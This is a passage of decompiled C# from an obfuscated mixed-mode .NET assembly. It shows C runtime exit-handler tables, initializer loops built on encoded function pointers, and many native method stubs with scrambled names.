    internal static bool \u0081\u00A9()
    {
      \u0083ú.\u0081é();
      return \u0083ú.\u0081\u00F7();
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static void \u0081\u00A0()
    {
      --\u0083ú.\u0083È;
      if (\u0083ú.\u0083È != 0)
        return;
      \u0083ú.\u0082\u0083();
    }

    [SecurityCritical]
    internal static unsafe int \u0081\u009B(
      __FnPtr<void ()> _param0,
      uint* _param1,
      __FnPtr<void ()>** _param2,
      __FnPtr<void ()>** _param3)
    {
      // ISSUE: cast to a function pointer type
      __FnPtr<void ()> local1 = (__FnPtr<void ()>) 0;
      if (_param0 == null)
        return -1;
      int num1;
      if (\u0083ú.ë())
      {
        try
        {
          __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u0083ú.ì((void*) *(int*) _param3);
          __FnPtr<void ()>* local3 = (__FnPtr<void ()>*) \u0083ú.ì((void*) *(int*) _param2);
          int num2 = (int) ((IntPtr) local3 - (IntPtr) local2);
          if (*_param1 - 1U < (uint) num2 >> 2)
          {
            try
            {
              uint num3 = *_param1 * 4U;
              uint num4 = num3 >= 2048U ? 2048U : num3;
              IntPtr cb = new IntPtr((int) num3 + (int) num4);
              IntPtr num5 = Marshal.ReAllocHGlobal(new IntPtr((void*) local2), cb);
              local3 = (__FnPtr<void ()>*) ((IntPtr) num5.ToPointer() + num2);
              local2 = (__FnPtr<void ()>*) num5.ToPointer();
              uint num6 = *_param1;
              uint num7 = 512U >= num6 ? num6 : 512U;
              *_param1 = num6 + num7;
            }
            catch (OutOfMemoryException ex)
            {
              IntPtr cb = new IntPtr((int) *_param1 * 4 + 8);
              IntPtr num8 = Marshal.ReAllocHGlobal(new IntPtr((void*) local2), cb);
              local3 = (__FnPtr<void ()>*) ((IntPtr) num8.ToPointer() - (IntPtr) local2 + (IntPtr) local3);
              local2 = (__FnPtr<void ()>*) num8.ToPointer();
              uint* numPtr = _param1;
              int num9 = (int) *numPtr + 4;
              *numPtr = (uint) num9;
            }
          }
          *(int*) local3 = (int) _param0;
          __FnPtr<void ()>* local4 = (__FnPtr<void ()>*) ((IntPtr) local3 + 4);
          local1 = _param0;
          *(int*) _param3 = (int) \u0083ú.ä((void*) local2);
          *(int*) _param2 = (int) \u0083ú.ä((void*) local4);
        }
        catch (OutOfMemoryException ex)
        {
        }
        finally
        {
          \u0083ú.\u0081\u00B1();
        }
        if (local1 != null)
        {
          num1 = 0;
          goto label_12;
        }
      }
      num1 = -1;
label_12:
      return num1;
    }

    [SecurityCritical]
    internal static unsafe void \u0081\u008A()
    {
      if (\u0083ú.é == 0U)
        return;
      __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083â);
      __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083Þ);
      if ((IntPtr) local1 != new IntPtr(-1) && (IntPtr) local1 != IntPtr.Zero && (IntPtr) local2 != IntPtr.Zero)
      {
        __FnPtr<void ()>* local3 = local1;
        __FnPtr<void ()>* local4 = local2;
        while (true)
        {
          __FnPtr<void ()>* local5;
          __FnPtr<void ()>* local6;
          do
          {
            do
            {
              local2 -= 4;
              if (local2 < local1)
                goto label_7;
            }
            while ((IntPtr) *(int*) local2 == (IntPtr) \u0083ú.ç());
            void* voidPtr = \u0083ú.ì((void*) *(int*) local2);
            *(int*) local2 = (int) \u0083ú.ç();
            // ISSUE: cast to a function pointer type
            // ISSUE: function pointer call
            __calli((__FnPtr<void ()>) (IntPtr) voidPtr)();
            local5 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083â);
            local6 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083Þ);
          }
          while (local3 == local5 && local4 == local6);
          local3 = local5;
          local1 = local5;
          local4 = local6;
          local2 = local6;
        }
label_7:
        Marshal.FreeHGlobal(new IntPtr((void*) local1));
      }
      \u0083ú.\u0081\u00A0();
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe int \u0081\u0086()
    {
      if (!\u0083ú.\u0081\u00A9())
        return 0;
      \u0083ú.\u0083â = (__FnPtr<void ()>*) \u0083ú.ä(Marshal.AllocHGlobal(128).ToPointer());
      \u0083ú.\u0083Þ = \u0083ú.\u0083â;
      \u0083ú.é = 32U;
      return 1;
    }

    internal static __FnPtr<int ()> \u0081\u0082(__FnPtr<int ()> _param0) => \u0083ú.ü((__FnPtr<void ()>) _param0) != -1 ? _param0 : (__FnPtr<int ()>) 0;

    [SecurityCritical]
    internal static unsafe int ü(__FnPtr<void ()> _param0) => \u0083ú.\u0081\u009B((__FnPtr<void ()>) (IntPtr) \u0083ú.ä((void*) _param0), &\u0083ú.é, &\u0083ú.\u0083Þ, &\u0083ú.\u0083â);

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe int \u00AC()
    {
      if (\u0083ú.\u0081\u00A9())
      {
        \u0083ú.\u0083ù = (__FnPtr<void ()>*) \u0083ú.ä(Marshal.AllocHGlobal(128).ToPointer());
        \u0083ú.\u0083è = \u0083ú.\u0083ù;
        \u0083ú.\u0084 = 32U;
      }
      return 1;
    }

    [HandleProcessCorruptedStateExceptions]
    [SecurityCritical]
    internal static unsafe void \u00A4()
    {
      if (\u0083ú.\u0084 == 0U)
        return;
      __FnPtr<void ()>* local1 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083ù);
      __FnPtr<void ()>* local2 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083è);
      try
      {
        if ((IntPtr) local1 == new IntPtr(-1) || (IntPtr) local1 == IntPtr.Zero || (IntPtr) local2 == IntPtr.Zero)
          return;
        __FnPtr<void ()>* local3 = local1;
        __FnPtr<void ()>* local4 = local2;
        while (true)
        {
          __FnPtr<void ()>* local5;
          __FnPtr<void ()>* local6;
          do
          {
            do
            {
              local2 -= 4;
            }
            while (local2 >= local1 && (IntPtr) *(int*) local2 == (IntPtr) \u0083ú.ç());
            if (local2 >= local1)
            {
              // ISSUE: cast to a function pointer type
              __FnPtr<void ()> local7 = (__FnPtr<void ()>) (IntPtr) \u0083ú.ì((void*) *(int*) local2);
              *(int*) local2 = (int) \u0083ú.ç();
              // ISSUE: function pointer call
              __calli(local7)();
              local5 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083ù);
              local6 = (__FnPtr<void ()>*) \u0083ú.ì((void*) \u0083ú.\u0083è);
            }
            else
              goto label_12;
          }
          while (local3 == local5 && local4 == local6);
          local3 = local5;
          local1 = local5;
          local4 = local6;
          local2 = local6;
        }
label_12:;
      }
      finally
      {
        Marshal.FreeHGlobal(new IntPtr((void*) local1));
        \u0083ú.\u0081\u00A0();
      }
    }

    [SecurityCritical]
    internal static __FnPtr<int ()> ó(__FnPtr<int ()> _param0) => \u0083ú.ï((__FnPtr<void ()>) _param0) != -1 ? _param0 : (__FnPtr<int ()>) 0;

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe int ï(__FnPtr<void ()> _param0) => \u0083ú.\u0081\u009B((__FnPtr<void ()>) (IntPtr) \u0083ú.ä((void*) _param0), &\u0083ú.\u0084, &\u0083ú.\u0083è, &\u0083ú.\u0083ù);

    [SecurityCritical]
    [SuppressUnmanagedCodeSecurity]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DllImport("KERNEL32.dll", EntryPoint = "DecodePointer")]
    public static extern unsafe void* ì(void* _param0);

    [SuppressUnmanagedCodeSecurity]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityCritical]
    [DllImport("MSVCR100.dll", EntryPoint = "_encoded_null", CallingConvention = CallingConvention.Cdecl)]
    public static extern unsafe void* ç();

    [SecurityCritical]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [DllImport("KERNEL32.dll", EntryPoint = "EncodePointer")]
    public static extern unsafe void* ä(void* _param0);

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe int á(__FnPtr<int ()>* _param0, __FnPtr<int ()>* _param1)
    {
      int num1 = 0;
      if (_param0 < _param1)
      {
        while (num1 == 0)
        {
          uint num2 = (uint) *(int*) _param0;
          if (num2 != 0U)
          {
            // ISSUE: cast to a function pointer type
            // ISSUE: function pointer call
            num1 = __calli((__FnPtr<int ()>) (int) num2)();
          }
          _param0 += 4;
          if (_param0 >= _param1)
            break;
        }
      }
      return num1;
    }

    [SecurityCritical]
    [DebuggerStepThrough]
    internal static unsafe void Û(__FnPtr<void ()>* _param0, __FnPtr<void ()>* _param1)
    {
      if (_param0 >= _param1)
        return;
      do
      {
        uint num = (uint) *(int*) _param0;
        if (num != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void ()>) (int) num)();
        }
        _param0 += 4;
      }
      while (_param0 < _param1);
    }

    [DebuggerStepThrough]
    internal static ModuleHandle Ù() => typeof (\u0081\u008E).Module.ModuleHandle;

    [SecurityCritical]
    [DebuggerStepThrough]
    [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
    internal static unsafe void Ê(__FnPtr<void* ()>* _param0, __FnPtr<void* ()>* _param1)
    {
      if (_param0 >= _param1)
        return;
      do
      {
        uint num = (uint) *(int*) _param0;
        if (num != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          void* voidPtr = __calli(\u0083ú.È((__FnPtr<void* ()>) (int) num))();
        }
        _param0 += 4;
      }
      while (_param0 < _param1);
    }

    [DebuggerStepThrough]
    [SecurityCritical]
    internal static unsafe __FnPtr<void* ()> È(__FnPtr<void* ()> _param0) => (__FnPtr<void* ()>) (IntPtr) \u0083ú.Ù().ResolveMethodHandle((int) _param0).GetFunctionPointer().ToPointer();

    [SecurityCritical]
    [HandleProcessCorruptedStateExceptions]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
    internal static unsafe void \u00B7(__FnPtr<void (void*)> _param0, void* _param1)
    {
      try
      {
        void* voidPtr = _param1;
        // ISSUE: function pointer call
        __calli(_param0)(voidPtr);
      }
      catch (Exception ex) when (\u0083ú.\u0081\u00A8((\u0081\u00BC*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    [SecurityCritical]
    [HandleProcessCorruptedStateExceptions]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
    internal static unsafe void \u0083Î(__FnPtr<void (void*)> _param0, void* _param1)
    {
      try
      {
        void* voidPtr = _param1;
        // ISSUE: function pointer call
        __calli(_param0)(voidPtr);
      }
      catch (Exception ex) when (\u0083ú.\u0081\u00A8((\u0081\u00BC*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SecurityCritical]
    [HandleProcessCorruptedStateExceptions]
    [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
    internal static unsafe void \u00A3(
      __FnPtr<void (void*, uint, int, __FnPtr<void (void*)>)> _param0,
      void* _param1,
      uint _param2,
      int _param3,
      __FnPtr<void (void*)> _param4)
    {
      try
      {
        void* voidPtr = _param1;
        int num1 = (int) _param2;
        int num2 = _param3;
        __FnPtr<void (void*)> local = _param4;
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli(_param0)((__FnPtr<void (void*)>) (IntPtr) voidPtr, num1, (uint) num2, (void*) local);
      }
      catch (Exception ex) when (\u0083ú.\u0081\u00A8((\u0081\u00BC*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    internal static int \u0099() => 0;

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0083\u00BB();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0096([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0091([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u008D();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0089();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0085([In] int obj0, [In] void* obj1, [In] void* obj2, [In] void* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0083\u0099([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0083\u00F7([In] byte* obj0, [In] void** obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0083ð([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0083ê();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe uint \u0083æ([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082ü([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082ö([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083Ù([In] byte* obj0, [In] int* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083Õ([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083Í([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083Å([In] byte* obj0, [In] sbyte* obj1, [In] int* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0083\u00BF([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083µ([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00AD(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] sbyte** obj3,
      [In] byte obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00AD(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] int obj3,
      [In] int obj4,
      [In] long obj5,
      [In] sbyte** obj6,
      [In] byte obj7);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00A4(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u00A4(
      [In] byte* obj0,
      [In] void* obj1,
      [In] void* obj2,
      [In] int obj3,
      [In] int obj4,
      [In] long obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u009D(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] sbyte** obj5);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u009D(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] sbyte* obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u009D(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] ulong obj3,
      [In] ulong obj4,
      [In] byte* obj5,
      [In] ushort obj6,
      [In] ushort obj7,
      [In] sbyte** obj8);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u0096([In] byte* obj0, [In] uint* obj1, [In] byte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u008F([In] byte* obj0, [In] byte* obj1);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u0091(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u0091(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] sbyte* obj3,
      [In] sbyte** obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u0091(
      [In] byte* obj0,
      [In] uint obj1,
      [In] ushort obj2,
      [In] byte* obj3,
      [In] ushort obj4,
      [In] ushort obj5,
      [In] sbyte** obj6);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083\u0083([In] byte* obj0, [In] void* obj1, [In] sbyte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0083ì([In] byte* obj0, [In] void* obj1, [In] sbyte* obj2, [In] byte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082ð([In] byte* obj0, [In] sbyte* obj1, [In] uint* obj2, [In] ulong* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082ð([In] byte* obj0, [In] sbyte* obj1, [In] uint* obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082é(
      [In] byte* obj0,
      [In] void* obj1,
      [In] uint obj2,
      [In] ulong obj3,
      [In] sbyte** obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082é([In] byte* obj0, [In] void* obj1, [In] uint obj2, [In] sbyte** obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082á([In] byte* obj0, [In] ulong obj1, [In] ulong obj2, [In] int* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082Û([In] byte* obj0, [In] sbyte* obj1, [In] int obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082Ò([In] byte* obj0, [In] sbyte* obj1, [In] ulong obj2, [In] int* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0082Ì([In] byte* obj0, [In] sbyte* obj1, [In] sbyte** obj2);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0082Å();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern ulong \u0082Á();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern long \u0082º();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern ulong \u0082\u00B2();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0082\u00A8();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u00A5(
      [In] byte* obj0,
      [In] void* obj1,
      [In] int* obj2,
      [In] sbyte* obj3,
      [In] int obj4);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0082\u00A5([In] byte* obj0, [In] void* obj1, [In] int obj2, [In] int obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0082\u00A2([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0082\u009B();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0082\u0096([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0082\u008D([In] byte* obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0082\u0087([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void \u0082\u0084([In] void* obj0, [In] int obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0081ý();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081\u0093([In] void* obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081ô([In] void* obj0, [In] void* obj1);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081í([In] void* obj0, [In] void* obj1, [In] int obj2, [In] void* obj3);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe void* \u0081ç();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0024([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0081á();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0081Ù([In] uint obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0083\u00B2();

    [SuppressUnmanagedCodeSecurity]
    [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0081Õ();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern void \u0081Í([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int \u0081Ê(
      [In] void* obj0,
      [In] \u0082\u0082 obj1,
      [In] void* obj2,
      [In] uint obj3);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern int \u0081Ç([In] int obj0);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
    [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
    internal static extern unsafe int* \u0081\u00BF();

    [SuppressUnmanagedCodeSecurity]
